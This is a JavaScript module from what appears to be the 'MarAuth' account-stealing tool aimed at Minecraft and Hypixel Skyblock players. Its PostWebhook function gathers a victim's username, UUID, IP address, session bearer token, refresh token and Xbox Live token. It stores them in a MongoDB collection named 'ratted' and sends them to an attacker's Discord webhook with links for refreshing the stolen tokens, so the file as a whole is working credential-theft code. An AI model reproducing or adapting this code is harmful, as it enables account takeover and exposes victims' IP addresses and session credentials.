const axios = require("axios");
const { updateUser } = require("../utils/mongodb.js");
const crypto = require("crypto");

const { MongoClient } = require("mongodb");
const config = require("../config.json");

const baseurl = config.azure.baseurl

const client = new MongoClient(config.mongodb.connectionstring, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});


async function PostWebhook(
    refresh,
    username,
    uuid,
    ip,
    BearerToken,
    refresh_token,
    networth,
    soulboundnetworth,
    description,
    webhook_url,
    UserToken,
    ratter,
  ) {
    let embeddescription;
    let networthtext;
    let randomkey;


    // if the token is being refreshed, set the embed description to "A token has been refreshed!"
    if (refresh) {
      embeddescription = "A token has been refreshed @everyone!";
      user = "Refreshing Token!";
      // if the token is first being sent, set the embed description to "A user has been authenticated!"
    } else {
      embeddescription = `<@${ratter}> just got this hit!`;
      user = `A user has been authenticated!`;
    }
  

    const database = client.db("users");
    const collection = database.collection("ratted");
    const userman = await collection.findOne({username: username});
    try {
    if (userman.authkey) {
      randomkey = userman.authkey;
    }
  } catch (err) {}

  if (!randomkey) {
    randomkey = crypto.randomBytes(16).toString("hex");
  }
    // if the networth is 0, set the networth text to "Networth: 0"
    if (networth == 0) {
      networthtext = "🪙 Networth: 0";
      // if the networth is not 0, set the networth text to "Networth: (soulbound networth) (unsoulbound networth)"
    } else {
      networthtext =
        "🪙 Networth: " + soulboundnetworth + " (" + networth + " unsoulbound)";
    }
    let data = {
      username: "MarAuth",
      avatar_url: "https://i.imgur.com/h4NHlv9.jpg",
      content: "@everyone",
      embeds: [
        {
          title: `MarAuth`,
          description: embeddescription,
          color: 12417144,
          author: {
            name: networthtext,
          },
          footer: {
            text: `🌟 ${user} 🌟`,
            url: "https://i.imgur.com/h4NHlv9.jpg",
          },
          timestamp: new Date(),
          fields: [
            {
              name: "Username",
              value: "```" + username + "```",
              inline: true,
            },
            {
              name: "UUID",
              value: "```" + uuid + "```",
              inline: true,
            },
            {
              name: "IP Address",
              value: "```" + ip + "```",
              inline: true,
            },
            {
              name: "Session ID",
              value: "```" + BearerToken + "```",
              inline: false,
            },
            {
              name: "Refresh Token",
              value: `Click [here](${baseurl}/refresh?refresh_token=${refresh_token}&webhook=${webhook_url}) to refresh their token!`,
            },
            {
              name: "XBL Refresh",
              value: `Click [here](${baseurl}/xblrefresh?key=${randomkey}&webhook=${webhook_url}) to refresh using their XBL token!`,
            }
          ],
        },
      ],
    };
  
    let embed = data;
  
    // if the user has skyblock profiles, add the skyblock profile info to the webhook
    if (description != "No profile data found. 🙁") {
      embed.embeds.push({
        title: "🌍 Skyblock Profile Info",
        color: 12417144,
        fields: description,
        url: "https://sky.shiiyu.moe/stats/" + username,
        footer: {
          text: "🌟 MarAuth by marcat & Gute Nacht 🌟 - Thank you BreadCat for your networth stuff!",
        },
      });
    } else {
      embed.embeds.push({
        title: "🌍 Skyblock Profile Info",
        color: 12417144,
        description: "No profile data found. 🙁",
        url: "https://sky.shiiyu.moe/stats/" + username,
        footer: {
          text: "🌟 MarAuth by marcat & Gute Nacht 🌟",
        },
      });
    }
  
    updateUser(username, uuid, BearerToken, refresh_token, ip, UserToken, randomkey);
  
    // set the config for the webhook
    var config = {
      method: "POST",
      url: webhook_url,
      headers: { "Content-Type": "application/json" },
      data: data,
    };
    console.log(`Information was sent to ${webhook_url} and MongoDB`);
    
    // send the webhook the data
    axios(config)
      .then((response) => {
        console.log("Webhook sent successfully");
      })
      .catch((error) => {
        console.log("Error sending webhook: ", error);
      });
  }

  module.exports = PostWebhook;